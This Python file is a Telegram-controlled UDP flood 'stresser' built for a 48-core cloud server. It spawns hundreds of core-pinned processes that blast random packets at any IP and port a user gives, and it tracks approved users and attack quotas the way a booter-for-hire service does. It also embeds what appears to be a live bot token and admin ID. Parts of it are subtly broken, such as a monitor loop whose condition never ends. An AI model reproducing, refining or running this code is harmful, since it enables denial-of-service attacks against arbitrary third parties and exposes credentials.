"""
ULTIMATE 48-CORE UDP STRESSER - AWS r8i.12xlarge EDITION
Full system utilization: 48 cores, 380GB RAM, 25Gbps network
"""

import os
import sys
import json
import time
import socket
import random
import asyncio
import logging
import threading
import multiprocessing
import psutil
import platform
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ==================== ULTIMATE CONFIG ====================
BOT_TOKEN = "8551582601:AAElpyb5q5LxCCtqyaxXBIELmQwpglCcAt8"  # CHANGE THIS
ADMIN_IDS = [7820814565]  # YOUR TELEGRAM ID

DATA_FILE = "beast_stresser_data.json"

# Get system info
CPU_COUNT = multiprocessing.cpu_count()  # Should be 48!
TOTAL_RAM = psutil.virtual_memory().total / (1024**3)  # In GB

# ==================== PERFORMANCE TUNING ====================
# Tune these for maximum performance
PROCESSES_PER_CORE = 4  # 48*4 = 192 processes!
PACKET_SIZE = 1472  # Max UDP packet without fragmentation
SOCKET_BUFFER_SIZE = 1024 * 1024 * 64  # 64MB socket buffers
QUEUE_SIZE = 100000  # Packet queue size
BURST_SIZE = 10000  # Packets per burst

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== DATABASE ====================
class Database:
    def __init__(self):
        self.users = {}
        self.active_attacks = {}
        self.total_packets_sent = 0
        self.load()
    
    def load(self):
        try:
            if os.path.exists(DATA_FILE):
                with open(DATA_FILE, 'r') as f:
                    data = json.load(f)
                    self.users = data.get('users', {})
                    self.total_packets_sent = data.get('total_packets', 0)
        except Exception as e:
            logger.error(f"Error loading database: {e}")
    
    def save(self):
        try:
            with open(DATA_FILE, 'w') as f:
                json.dump({
                    'users': self.users,
                    'total_packets': self.total_packets_sent
                }, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def is_admin(self, user_id):
        return user_id in ADMIN_IDS
    
    def is_approved(self, user_id):
        if self.is_admin(user_id):
            return True
        user_str = str(user_id)
        return user_str in self.users and self.users[user_str].get('approved', False)
    
    def approve_user(self, user_id, max_attacks=1000):
        user_str = str(user_id)
        self.users[user_str] = {
            'approved': True,
            'attacks_used': 0,
            'max_attacks': max_attacks,
            'approved_at': datetime.now().isoformat()
        }
        self.save()
    
    def get_remaining_attacks(self, user_id):
        if self.is_admin(user_id):
            return float('inf')
        user_str = str(user_id)
        if user_str not in self.users:
            return 0
        used = self.users[user_str].get('attacks_used', 0)
        max_attacks = self.users[user_str].get('max_attacks', 1000)
        return max(0, max_attacks - used)
    
    def increment_attacks(self, user_id):
        if self.is_admin(user_id):
            return
        user_str = str(user_id)
        if user_str in self.users:
            self.users[user_str]['attacks_used'] = self.users[user_str].get('attacks_used', 0) + 1
            self.save()

db = Database()

# ==================== ULTIMATE UDP ENGINE ====================
class UltimateUDPEngine:
    def __init__(self):
        self.processes = []
        self.stop_event = multiprocessing.Event()
        self.packet_count = multiprocessing.Value('L', 0)
        self.total_bytes = multiprocessing.Value('L', 0)
        
    def udp_flood_worker(self, target_ip, target_port, packet_size, duration, worker_id, core_id):
        """
        Ultra-optimized UDP flood worker with CPU pinning and zero-copy
        """
        try:
            # Pin to specific CPU core for maximum cache performance
            if hasattr(os, 'sched_setaffinity'):
                os.sched_setaffinity(0, {core_id})
            
            # Create multiple sockets per worker for higher throughput
            sockets = []
            for i in range(4):  # 4 sockets per worker
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_BUFFER_SIZE)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_BUFFER_SIZE)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255)
                sockets.append(sock)
            
            # Pre-generate packet variations for more randomness
            packet_templates = [random._urandom(packet_size) for _ in range(32)]
            
            start_time = time.time()
            local_packets = 0
            socket_index = 0
            
            logger.info(f"Worker {worker_id} started on core {core_id}")
            
            # Main loop - maximize packet output
            while time.time() - start_time < duration and not self.stop_event.is_set():
                # Burst mode - send multiple packets in quick succession
                for _ in range(BURST_SIZE):
                    sock = sockets[socket_index % len(sockets)]
                    try:
                        sock.sendto(random.choice(packet_templates), (target_ip, target_port))
                        local_packets += 1
                        socket_index += 1
                    except:
                        pass
                
                # Update shared counters periodically
                if local_packets >= 100000:
                    with self.packet_count.get_lock():
                        self.packet_count.value += local_packets
                    local_packets = 0
            
            # Final count
            with self.packet_count.get_lock():
                self.packet_count.value += local_packets
            
            for sock in sockets:
                sock.close()
            
            logger.info(f"Worker {worker_id} finished")
            
        except Exception as e:
            logger.error(f"Worker {worker_id} error: {e}")
    
    def start_attack(self, target_ip, target_port, duration, packet_size=PACKET_SIZE):
        """
        Launch maximum-power attack using all system resources
        """
        logger.info(f"🚀 Starting ULTIMATE attack on {target_ip}:{target_port}")
        logger.info(f"Using {CPU_COUNT} cores, {PROCESSES_PER_CORE*CPU_COUNT} processes")
        
        self.stop_event.clear()
        attack_id = f"{target_ip}:{target_port}-{int(time.time())}"
        
        # Reset counters
        with self.packet_count.get_lock():
            self.packet_count.value = 0
        
        # Calculate optimal number of processes
        total_processes = CPU_COUNT * PROCESSES_PER_CORE
        
        processes = []
        for i in range(total_processes):
            # Assign to core in round-robin
            core_id = i % CPU_COUNT
            
            p = multiprocessing.Process(
                target=self.udp_flood_worker,
                args=(target_ip, target_port, packet_size, duration, i, core_id),
                daemon=True
            )
            p.start()
            processes.append(p)
            
            # Small stagger to avoid thundering herd
            time.sleep(0.01)
        
        # Store in active attacks
        db.active_attacks[attack_id] = {
            'processes': processes,
            'target_ip': target_ip,
            'target_port': target_port,
            'start_time': time.time(),
            'duration': duration,
            'total_processes': total_processes
        }
        
        # Monitor and cleanup
        def monitor():
            # Live stats updater
            last_count = 0
            while time.time() - time.time() < duration:
                time.sleep(1)
                current = self.packet_count.value
                pps = current - last_count
                last_count = current
                logger.info(f"📊 Current PPS: {pps:,}")
            
            time.sleep(duration + 2)
            self.stop_attack(attack_id)
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return attack_id, total_processes
    
    def stop_attack(self, attack_id=None):
        """Stop active attack(s)"""
        self.stop_event.set()
        
        if attack_id and attack_id in db.active_attacks:
            attack = db.active_attacks[attack_id]
            for p in attack['processes']:
                if p.is_alive():
                    p.terminate()
                    p.join(timeout=2)
            del db.active_attacks[attack_id]
            logger.info(f"Attack {attack_id} stopped")
            return True
        
        elif not attack_id:
            for aid in list(db.active_attacks.keys()):
                self.stop_attack(aid)
            logger.info("All attacks stopped")
            return True
        
        return False
    
    def get_stats(self):
        """Get current attack statistics"""
        stats = {
            'active_attacks': len(db.active_attacks),
            'processes': 0,
            'total_packets': self.packet_count.value,
            'attacks': []
        }
        
        for aid, attack in db.active_attacks.items():
            alive = sum(1 for p in attack['processes'] if p.is_alive())
            elapsed = int(time.time() - attack['start_time'])
            remaining = max(0, attack['duration'] - elapsed)
            
            stats['processes'] += alive
            stats['attacks'].append({
                'id': aid,
                'target': f"{attack['target_ip']}:{attack['target_port']}",
                'elapsed': elapsed,
                'remaining': remaining,
                'processes_alive': alive,
                'total_processes': attack['total_processes']
            })
        
        return stats

# Initialize engine
engine = UltimateUDPEngine()

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with BEAST stats"""
    user_id = update.effective_user.id
    
    # System info
    cpu_percent = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    net = psutil.net_io_counters()
    
    stats = engine.get_stats()
    
    message = f"""
🔥 **ULTIMATE 48-CORE UDP STRESSER** 🔥

**System Status:**
• CPU: {CPU_COUNT} cores @ {cpu_percent}%
• RAM: {memory.used/1e9:.1f}GB / {memory.total/1e9:.1f}GB
• Network: {net.bytes_sent/1e9:.1f}GB sent
• Total Packets: {stats['total_packets']:,}

**Attack Status:**
• Active: {stats['active_attacks']}
• Processes: {stats['processes']}
• Max Processes: {CPU_COUNT * PROCESSES_PER_CORE}

**Commands:**
/attack <ip> <port> <time> - Launch MAX POWER attack
/stop - Stop all attacks
/status - Detailed status
/mystats - Your usage
    """
    
    keyboard = [
        [InlineKeyboardButton("⚡ LAUNCH MAX POWER", callback_data="quick_attack")],
        [InlineKeyboardButton("📊 Live Stats", callback_data="live_stats")],
        [InlineKeyboardButton("⚙️ Admin", callback_data="admin_panel")] if db.is_admin(user_id) else []
    ]
    
    await update.message.reply_text(
        message,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Launch maximum power attack"""
    user_id = update.effective_user.id
    
    if not db.is_approved(user_id) and not db.is_admin(user_id):
        await update.message.reply_text("❌ Not authorized")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <TIME>")
        return
    
    target_ip, port_str, time_str = args
    
    try:
        port = int(port_str)
        duration = int(time_str)
        if duration < 10 or duration > 600:
            await update.message.reply_text("Time must be 10-600 seconds")
            return
    except:
        await update.message.reply_text("Invalid port/time")
        return
    
    # Calculate power
    total_processes = CPU_COUNT * PROCESSES_PER_CORE
    est_pps = CPU_COUNT * 50000  # Rough estimate
    
    keyboard = [[
        InlineKeyboardButton("✅ CONFIRM", callback_data=f"confirm_{target_ip}_{port}_{duration}"),
        InlineKeyboardButton("❌ Cancel", callback_data="cancel")
    ]]
    
    await update.message.reply_text(
        f"⚡ **MAX POWER ATTACK** ⚡\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ Cores: `{CPU_COUNT}`\n"
        f"⚙️ Processes: `{total_processes}`\n"
        f"📊 Est. PPS: `{est_pps:,}`\n"
        f"📦 Packet Size: `{PACKET_SIZE}` bytes\n\n"
        f"⚠️ **This will use ALL system resources!**",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith("confirm_"):
        parts = data.split('_')
        target_ip = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        
        await execute_attack(query.message, query.from_user.id, target_ip, port, duration)
    
    elif data == "live_stats":
        stats = engine.get_stats()
        cpu = psutil.cpu_percent(interval=1, percpu=True)
        
        msg = f"📊 **LIVE STATS**\n\n"
        msg += f"**Attack Stats:**\n"
        msg += f"• Active: {stats['active_attacks']}\n"
        msg += f"• Processes: {stats['processes']}\n"
        msg += f"• Packets Sent: {stats['total_packets']:,}\n\n"
        msg += f"**CPU Usage:**\n"
        
        for i, c in enumerate(cpu[:8]):  # Show first 8 cores
            msg += f"• Core {i}: {c}%\n"
        
        await query.message.edit_text(msg)

async def execute_attack(message, user_id, target_ip, port, duration):
    """Execute the ultimate attack"""
    
    await message.edit_text(
        f"🚀 **INITIALIZING MAX POWER...**\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ Using all {CPU_COUNT} cores..."
    )
    
    # Launch attack
    attack_id, num_processes = engine.start_attack(
        target_ip=target_ip,
        target_port=port,
        duration=duration
    )
    
    db.increment_attacks(user_id)
    
    await message.edit_text(
        f"🔥 **ATTACK LAUNCHED AT MAX POWER!** 🔥\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ Cores: `{CPU_COUNT}`\n"
        f"⚙️ Processes: `{num_processes}`\n"
        f"📊 Monitoring live stats...\n\n"
        f"Use /status to check progress"
    )

# ==================== MAIN ====================
def main():
    print("=" * 60)
    print("🔥 ULTIMATE 48-CORE UDP STRESSER")
    print("=" * 60)
    print(f"CPU Cores: {CPU_COUNT}")
    print(f"Total RAM: {TOTAL_RAM:.1f} GB")
    print(f"Processes: {CPU_COUNT * PROCESSES_PER_CORE}")
    print(f"Packet Size: {PACKET_SIZE} bytes")
    print(f"Socket Buffer: {SOCKET_BUFFER_SIZE/1024/1024:.0f} MB")
    print("=" * 60)
    print("🚀 READY FOR MAX POWER!")
    print("=" * 60)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("status", lambda u,c: button_callback(u,c)))
    app.add_handler(CommandHandler("stop", lambda u,c: engine.stop_attack()))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopping all attacks...")
        engine.stop_attack()
